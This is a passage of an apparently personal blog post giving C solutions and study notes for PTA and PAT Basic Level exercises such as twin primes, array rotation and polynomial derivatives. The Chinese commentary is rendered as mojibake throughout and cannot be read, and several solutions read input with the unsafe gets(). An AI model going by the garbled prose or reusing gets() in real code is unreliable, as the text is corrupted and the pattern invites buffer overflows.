class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, sum_0 = <span class="number">0</span>, sum_1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, score = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> count_1 = <span class="number">0</span>, count_2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">while</span>(N--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;score);</span><br><span class="line"><span class="keyword">if</span>(n)</span><br><span class="line">sum_1 += score, count_1++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">sum_0 += score, count_2++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.1lf"</span>, (<span class="keyword">double</span>)(sum_1+sum_0)/(count_1+count_2));</span><br><span class="line"><span class="keyword">if</span>(count_1)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %.1lf"</span>, (<span class="keyword">double</span>)sum_1/count_1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" X"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count_2) <span class="comment">//è¿™é‡Œï¼ï¼ï¼å¼€å§‹ä¸€ç›´ä½¿ç”¨çš„æ€»åˆ†æ•°æ˜¯å¦ä¸º0æ¥è¡¡é‡äººæ•°æ˜¯å¦ä¸º0ï¼ä½†äººä¼šæœ‰0åˆ†çš„æƒ…å†µå•Šã€‚</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %.1lf"</span>, (<span class="keyword">double</span>)sum_0/count_2);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" X"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.ä¸‹é¢è¿™ä¸ªé¢˜çŠ¯äº†å·®ä¸å¤šçš„é”™ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå°±æ˜¯å€’åºè¾“å‡ºæ•°å­—ï¼Œå¯ä»¥å¾ˆå¤šæ–¹æ³•ã€‚æˆ‘ä½¿ç”¨çš„å°†æ¯ä½æ•°å­—å…ˆåˆ†ç¦»å‡ºæ¥å­˜å…¥ä¸€ä¸ªæ•°ç»„ï¼Œåœ¨å€’åºè¾“å‡ºã€‚ ä½†è¿™é‡Œæœ‰ä¸€ä¸ª0çš„æƒ…å†µï¼Œå¦‚æœæ•°å­—ä¸º0ï¼Œé‚£åˆ†ç¦»æ•°å­—çš„ç»“æœå°±æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰å³ä»€ä¹ˆä¹Ÿä¸è¾“å‡ºã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200601100305684.png" alt="image-20200601100305684"></p><p>è¿™é‡Œå…¶å®ç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡ºå°±å¥½äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ch[<span class="number">13</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;a, &amp;b);</span><br><span class="line"><span class="built_in">sprintf</span>(ch, <span class="string">"%d"</span>, a += b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; ch[i]; <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, ch[i++]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼š2ä¸ªé¢˜é‡åˆ°åŒç§ç±»å‹çš„é”™è¯¯ï¼ŒæŠ˜ç£¨äº†æˆ‘å¾ˆä¹…ï¼Œä½†å¯¹è‡ªå·±è¿›è¡Œè¡¥æ¼äº†ã€‚æ³¨æ„0çš„æƒ…å†µå¾ˆé‡è¦ã€‚</strong></p><p>3.è¿™ä¸ªé¢˜æ³¨æ„ï¼Œé¢˜ç›®åªè¯´äº†è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ²¡è¶…è¿‡1000ä½ï¼Œç¬¬äºŒä¸ªæœªçŸ¥çš„ï¼Œæœ‰ç‚¹å°å‘ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200603085822035.png" alt="image-20200603085822035"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10001</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">2001</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, lenth1 = <span class="number">0</span>, lenth2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">gets(a);</span><br><span class="line">    lenth1 = <span class="built_in">strlen</span>(a);</span><br><span class="line">    </span><br><span class="line">gets(b); </span><br><span class="line"><span class="keyword">while</span>(*b != <span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line">        lenth2 = <span class="built_in">strlen</span>(b);</span><br><span class="line">        <span class="keyword">if</span>(lenth1 != lenth2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth1; i++)</span><br><span class="line">        sum += <span class="built_in">abs</span>(a[i]-b[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(sum &lt;= <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">&#125;    </span><br><span class="line">        </span><br><span class="line">sum = <span class="number">0</span>, gets(b); </span><br><span class="line">&#125; </span><br><span class="line">     </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.å¤„ç†å¥½æ¯æ¬¡èµ¢è¾“ä¹‹é—´çš„å˜æ¢ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200603090014331.png" alt="image-20200603090014331"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">getchar(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; a[j%N]; i++)</span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'E'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'C'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bu\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(*s == <span class="string">'J'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ChuiZi\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"JianDao\n"</span>);</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'E'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'C'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"JianDao\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(*s == <span class="string">'J'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bu\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ChuiZi\n"</span>);</span><br><span class="line">flag = <span class="number">0</span>, j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PATä¹™çº§"><a href="#PATä¹™çº§" class="headerlink" title="PATä¹™çº§"></a>PATä¹™çº§</h2><h3 id="æˆ‘è¦é€šè¿‡"><a href="#æˆ‘è¦é€šè¿‡" class="headerlink" title="æˆ‘è¦é€šè¿‡"></a>æˆ‘è¦é€šè¿‡</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200613104611755.png" alt="image-20200613104611755"></p><p><strong>é¢˜ç›®çš„éš¾ç‚¹ä¹Ÿå°±æ˜¯æ¡ä»¶ä¸‰ï¼Œå¦‚æœæ²¡æœ‰ç†è§£åˆ°ä½ï¼Œæ€»æ˜¯ä¼šæœ‰æ¡ä»¶è¿‡ä¸äº†ã€‚ã€‚ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(<span class="keyword">char</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>, other = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>, t = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> q = <span class="number">0</span>, z = <span class="number">0</span>, h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == <span class="string">'A'</span>)</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">q++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">z++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">h++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] == <span class="string">'P'</span>)</span><br><span class="line">p++, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] == <span class="string">'T'</span>)</span><br><span class="line">t++, flag = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">other++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">1</span> &amp;&amp; p == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!other &amp;&amp; z &amp;&amp; q*z == h &amp;&amp; p == <span class="number">1</span> &amp;&amp; t == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">101</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar(); </span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(a);</span><br><span class="line"><span class="keyword">if</span>(judge(a))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1007-ç´ æ•°å¯¹çŒœæƒ³"><a href="#1007-ç´ æ•°å¯¹çŒœæƒ³" class="headerlink" title="1007 ç´ æ•°å¯¹çŒœæƒ³"></a>1007 ç´ æ•°å¯¹çŒœæƒ³</h3><p>ä¸»è¦è®°å½•ä¸€ä¸‹ç´ æ•°çš„ä¼˜åŒ–æŠ€å·§ï¼Œè¿™ä¸ªé¢˜åªæ˜¯ç”¨æ™®é€šçš„æ–¹æ³•åˆ¤æ–­ä¼šåœ¨æœ€åä¸€ä¸ªæµ‹è¯•ç‚¹è¶…æ—¶ã€‚</p><ol><li><strong>å¶æ•°é™¤2ä¹‹å¤–éƒ½ä¸æ˜¯ç´ æ•°ï¼Œæ‰€ä»¥åœ¨åˆ¤æ–­é‚£äº›æ˜¯ç´ æ•°æ—¶ï¼Œå¯ä»¥æŠŠ2å•ç‹¬å¤„ç†ï¼Œå…¶ä»–çš„æ¯æ¬¡åŠ 2ï¼Œåªçœ‹å¥‡æ•°ã€‚</strong></li><li><strong>åœ¨ç´ æ•°åˆ¤æ–­æ—¶ï¼Œå…ˆå¯¹æ‰€è¦åˆ¤æ–­çš„æ•°å¼€å¹³æ–¹ï¼Œæ—¶é—´å¤æ‚åº¦å¤§å¤§é™ä½ã€‚</strong></li></ol><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200622084350397.png" alt="image-20200622084350397"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prime_number</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, temp = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>((<span class="keyword">double</span>)a); <span class="comment">//å…ˆå¼€æ–¹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt;= temp; i++)</span><br><span class="line"><span class="keyword">if</span>(a%i == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, N = <span class="number">0</span>, count = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">temp = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt;= N; i += <span class="number">2</span>)<span class="comment">//åªçœ‹å¥‡æ•°</span></span><br><span class="line"><span class="keyword">if</span>(prime_number(i))</span><br><span class="line">count += i-temp == <span class="number">2</span> ? <span class="number">1</span>:<span class="number">0</span>, temp = i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1008-æ•°ç»„å…ƒç´ å¾ªç¯å³ç§»é—®é¢˜"><a href="#1008-æ•°ç»„å…ƒç´ å¾ªç¯å³ç§»é—®é¢˜" class="headerlink" title="1008 æ•°ç»„å…ƒç´ å¾ªç¯å³ç§»é—®é¢˜"></a>1008 æ•°ç»„å…ƒç´ å¾ªç¯å³ç§»é—®é¢˜</h3><p>æœ¬ä»¥ä¸ºç§’ç­”çš„é¢˜ï¼Œæœ‰ä¸ªæµ‹è¯•ç‚¹ï¼Œå¡åŠå¤©ã€‚æˆ‘å‘ç°å†™ç¨‹åºä»€ä¹ˆé”™è¯¯éƒ½ä¼šçŠ¯ã€‚ã€‚</p><p>è¿™é‡Œè¿˜æ˜¯å…ˆæ€»ç»“ä¸€ä¸‹ï¼Œå…³äºæ•°ç»„å¾ªç¯ç§»åŠ¨è¾“å‡ºçš„é—®é¢˜ï¼šå‡è®¾æ•°ç»„ï¼šaï¼Œé•¿åº¦ï¼šlen</p><ol><li>å¾ªç¯å·¦ç§»nä½ï¼š<code>a[n+i%len]</code></li><li>å¾ªç¯å³ç§»nä½ï¼šä¸å·¦ç§»åŸç†ä¸€æ ·ï¼Œåªä¸èµ·å§‹ç‚¹ç”¨æ€»é•¿åº¦å‡ä¸€ä¸‹ï¼š<code>a[(len-(n%len)+i)%n]</code></li></ol><p>é¢˜ç›®ï¼š</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200623122843536.png" alt="image-20200623122843536"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, a[<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;, span = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;span);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a[(n-span%n)%n]);  <span class="comment">//è¿™é‡Œå¼€å§‹ä¸€ç›´å¿˜è®°æœ€åé¢çš„ %n ...</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, a[(n-span%n+i)%n]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šæˆ‘éƒ½ä¸çŸ¥é“æˆ‘æ€ä¹ˆæ‰¾è¿™ä¹ˆä¸€ä¸ªé”™è¯¯çš„ã€‚</p><h3 id="1010-ä¸€å…ƒå¤šé¡¹å¼æ±‚å¯¼"><a href="#1010-ä¸€å…ƒå¤šé¡¹å¼æ±‚å¯¼" class="headerlink" title="1010 ä¸€å…ƒå¤šé¡¹å¼æ±‚å¯¼"></a>1010 ä¸€å…ƒå¤šé¡¹å¼æ±‚å¯¼</h3><p>é¢˜ç›®æ„Ÿè§‰ç®€å•ï¼Œä½†æ˜¯å¥½å‘ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200626101205673.png" alt="image-20200626101205673"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pre = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;pre, &amp;cur);</span><br><span class="line"><span class="keyword">if</span>(!cur)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0 0"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d"</span>, pre*cur, cur<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;pre, &amp;cur) != EOF) <span class="comment">//!!!ï¼Œè¿™é‡Œå¾ˆé‡è¦ã€‚</span></span><br><span class="line"><span class="keyword">if</span>(cur)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d %d"</span>, pre*cur, cur<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šå¯¹è¾“å…¥çš„å¦‚ä½•é™å®šåœæ­¢ã€‚</p><h3 id="1014-ç¦å°”æ‘©æ–¯çš„çº¦ä¼š"><a href="#1014-ç¦å°”æ‘©æ–¯çš„çº¦ä¼š" class="headerlink" title="1014 ç¦å°”æ‘©æ–¯çš„çº¦ä¼š"></a>1014 ç¦å°”æ‘©æ–¯çš„çº¦ä¼š</h3><p>æ„Ÿè§‰é¢˜ç›®å¾ˆå¤šéƒ½ä¸è¯´æ˜ï¼Œè‡ªå·±åœ¨å“ªé‡ŒçŒœæœ‰æ²¡æœ‰é™åˆ¶æ¡ä»¶ï¼Œç»“æœéƒ½æœ‰ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200706184943170.png" alt="image-20200706184943170"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 